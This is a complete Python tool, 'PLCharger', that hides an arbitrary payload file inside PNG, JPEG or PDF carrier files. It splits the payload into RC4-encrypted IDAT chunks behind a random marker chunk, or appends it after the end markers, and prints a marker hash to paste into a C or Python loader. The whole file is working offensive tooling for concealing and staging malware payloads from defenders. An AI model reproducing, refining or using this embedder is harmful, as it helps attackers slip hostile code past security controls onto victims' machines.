# ==========================================================
# Payload Embedder (Charger)
# Author: Abel Philippe
# ==========================================================

import os
import sys
import argparse
import subprocess
import shutil
import secrets
import random
import zlib
import colorama
import Crypto

from Crypto.Cipher import ARC4
from colorama import Fore, Style, init
#===========================================================

# ---------------------
#  Initialize colorama
# ---------------------
init(autoreset=True)
banner = f"""
     ██▓███   ██▓     ▄████▄   ██░ ██  ▄▄▄       ██▀███    ▄████ ▓█████  ██▀███
    ▓██░  ██▒▓██▒    ▒██▀ ▀█  ▓██░ ██▒▒████▄    ▓██ ▒ ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
    ▓██░ ██▓▒▒██░    ▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
    ▒██▄█▓▒ ▒▒██░    ▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
    ▒██▒ ░  ░░██████▒▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
    ▒▓▒░ ░  ░░ ▒░▓  ░░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
    ░▒ ░     ░ ░ ▒  ░  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░  ░   ░  ░ ░  ░  ░▒ ░ ▒░
    ░░         ░ ░   ░         ░  ░░ ░  ░   ▒     ░░   ░ ░ ░   ░    ░     ░░   ░ 
             ░  ░░ ░       ░  ░  ░      ░  ░   ░           ░    ░  ░   ░     
                 ░                                                           
    =============================================================================
    --------------------- PLCHARGER - The Payload Embedder ----------------------
    ------------------------ Developed by AbelPhilippe --------------------------
    =============================================================================           
    
    """

help_text = f"""
    General:
        -h, --help      Show this help message
        -i, --input     Payload file
        -png, --png     Carrier PNG
        -j --jpeg       Carrier JPEG
        -d, --pdf       Carrier PDF
        -o, --output    Output Path
    
    Example:
        python plcharger.py -i payload.bin -png carrier.png -o output.png
        
        """


def print_banner():
    print(f"{Fore.RED}{banner}{Style.RESET_ALL}", flush=True)

def show_help():
    print_banner()
    print(f"{Fore.RED}{help_text}{Style.RESET_ALL}", flush=True)
    sys.exit(0)

# ==========================================================
# Constants
# ==========================================================

PNG_HEADER = b'\x89PNG\r\n\x1a\n'
IDAT = b'IDAT'
IEND = b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'

JPEG_EOI = b"\xFF\xD9"
JPEG_MARKER = b"PLCHARGER_JPEG\n"

MAX_IDAT_SIZE = 8192
RC4_KEY_SIZE = 16

# ==========================================================
# Logging Helpers
# ==========================================================

def log(msg, color=Fore.WHITE):
    print(f"{color}{msg}{Style.RESET_ALL}")


def info(msg): log(f"[i] {msg}", Fore.CYAN)
def success(msg): log(f"[+] {msg}", Fore.GREEN)
def warning(msg): log(f"[!] {msg}", Fore.YELLOW)
def error(msg): log(f"[X] {msg}", Fore.RED)

# ==========================================================
# Utility Functions
# ==========================================================

def random_bytes(size=RC4_KEY_SIZE):
    return secrets.token_bytes(size)


def calculate_crc(data: bytes) -> bytes:
    return zlib.crc32(data).to_bytes(4, "big")


def remove_from_end(file, size):
    try:
        with open(file, "rb+") as f:
            f.seek(0, 2)
            f.truncate(f.tell() - size)
    except Exception as e:
        raise IOError(f"Truncate error: {e}")


# ==========================================================
# Crypto
# ==========================================================

def rc4_encrypt(key, data):
    cipher = ARC4.new(key)
    return cipher.encrypt(data)
# ==========================================================
# JPEG Handling
# ==========================================================

def is_jpeg(path):
    try:
        with open(path, "rb") as f:
            sig = f.read(2)
            return sig == b"\xFF\xD8"
    except:
        return False
    
# ==========================================================
# PNG Handling
# ==========================================================

def is_png(path):
    try:
        with open(path, "rb") as f:
            return f.read(8) == PNG_HEADER
    except Exception:
        return False


def read_file(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception as e:
        raise IOError(f"Read error: {e}")


def create_idat_chunk(data: bytes):
    if len(data) > MAX_IDAT_SIZE:
        raise ValueError("IDAT chunk too large")

    length = len(data).to_bytes(4, "big")
    crc = calculate_crc(IDAT + data)

    chunk = length + IDAT + data + crc

    info(f"Created IDAT: {len(data)} bytes | CRC {crc.hex()}")

    return chunk, crc

# ==========================================================
# PDF Handling
# ==========================================================


def is_pdf(path):
    try:
        with open(path, "rb") as f:
            return f.read(5) == b"%PDF-"
    except Exception:
        return False


# ==========================================================
# Payload PNG Embedder
# ==========================================================

def embed_payload_png(input_png, output_png, payload):
    #---------------
    # Copy base PNG
    #---------------
    shutil.copy(input_png, output_png)

    # --------------
    # Remove footer
    # --------------
    remove_from_end(output_png, len(IEND))

    info("IEND removed")

    # -------------
    # Marker chunk
    # -------------
    marker, marker_crc = create_idat_chunk(
        random_bytes(random.randint(16, 256))
    )

    with open(output_png, "ab") as f:
        f.write(marker)

    info("Marker IDAT added")

    # ------------------------
    # Encrypted payload chunks
    # ------------------------
    chunk_size = MAX_IDAT_SIZE - RC4_KEY_SIZE

    with open(output_png, "ab") as f:

        for i in range(0, len(payload), chunk_size):

            key = random_bytes()
            encrypted = rc4_encrypt(key, payload[i:i + chunk_size])

            data = key + encrypted

            chunk, _ = create_idat_chunk(data)

            f.write(chunk)

            info(f"Encrypted chunk | Key: {key.hex()}")
    # --------------
    # Restore footer
    # --------------
    with open(output_png, "ab") as f:
        f.write(IEND)

    info("IEND restored")

    return marker_crc

# ==========================================================
# Payload PDF Embedder
# ==========================================================

def embed_payload_pdf(input_pdf, output_pdf, payload):

    #---------------
    # Copy base PDF
    #---------------
    shutil.copy(input_pdf, output_pdf)

    key = random_bytes()
    encrypted = rc4_encrypt(key, payload)
    compressed = zlib.compress(encrypted)

    try:
        with open(output_pdf, "ab") as f:

            f.write(b"\n%EOF\n")
            f.write(compressed)

        success(f"Payload embedded (key={key.hex()})")

    except Exception as e:
        raise IOError(f"PDF embed error: {e}")

# ==========================================================
# Payload JPEG Embedder
# ==========================================================

def embed_payload_jpeg(input_jpeg, output_jpeg, payload):

    shutil.copy(input_jpeg, output_jpeg)

    key = random_bytes()
    encrypted = rc4_encrypt(key, payload)
    compressed = zlib.compress(encrypted)

    try:
        with open(output_jpeg, "ab") as f:

            f.write(b"\n" + JPEG_MARKER)
            f.write(key)
            f.write(compressed)

        success(f"Payload embedded (key={key.hex()})")

    except Exception as e:
        raise IOError(f"JPEG embed error: {e}")


# ==========================================================
#                         CLI
# ==========================================================

def parse_args():

    parser = argparse.ArgumentParser(
        add_help=False
    )

    parser.add_argument("-h", "--help", action="store_true")

    parser.add_argument("-i", "--input")
    parser.add_argument("-png", "--png")
    parser.add_argument("-j", "--jpeg")
    parser.add_argument("-d", "--pdf")
    parser.add_argument("-o", "--output")

    return parser.parse_known_args()


# ==========================================================
# Main
# ==========================================================

def main():

    try:

        args, unknown = parse_args()

        if len(sys.argv) == 1:
            print_banner()
            sys.exit(0)

        # Help → banner + help
        if args.help:
            show_help()

        if not args.input or not args.output:
            show_help()

        print_banner()

        payload = read_file(args.input)

        info("Payload loaded")

        # PNG Mode
        if args.png:

            if not is_png(args.png):
                error("Invalid PNG file")
                sys.exit(1)

            if not args.output.endswith(".png"):
                args.output += ".png"

            info("PNG carrier detected")
            info("Embedding...")

            crc = embed_payload_png(
                args.png,
                args.output,
                payload
            )

            success(f"Output: {args.output}")

            print()
            print(f"{Fore.GREEN}# Copy this to C:{Fore.RESET}")
            print(f"{Fore.CYAN}#define MARKED_IDAT_HASH  0x{int.from_bytes(crc,'big'):X}{Fore.RESET}")
            print(f"-------------------------")
            print(f"{Fore.GREEN}# Copy this to Python:{Fore.RESET}")
            print(f"{Fore.CYAN}MARKED_IDAT_HASH = 0x{int.from_bytes(crc,'big'):X}{Fore.RESET}")
        elif args.jpeg:
            if not is_jpeg(args.jpeg):
                error("Invalid JPEG file")
                sys.exit(1)
            
            if not args.output.endswith(".jpg"):
                args.output += ".jpg"
            info("JPEG carrier detected")
            info("Embedding...")
            
            embed_payload_jpeg(args.jpeg,
                               args.output,
                                payload)

            success(f"Output: {args.output}")
        

        # PDF Mode
        elif args.pdf:

            if not is_pdf(args.pdf):
                error("Invalid PDF file")
                sys.exit(1)

            if not args.output.endswith(".pdf"):
                args.output += ".pdf"

            info("PDF carrier detected")
            info("Embedding...")

            embed_payload_pdf(
                args.pdf,
                args.output,
                payload
            )

            success(f"Output: {args.output}")

        else:
            show_help()

    except FileNotFoundError as e:
        error(e)

    except ValueError as e:
        error(e)

    except IOError as e:
        error(e)

    except KeyboardInterrupt:
        warning("Interrupted")

    except Exception as e:
        error(f"Unhandled error: {e}")

        if "--debug" in sys.argv:
            raise

if __name__ == "__main__":
    main()
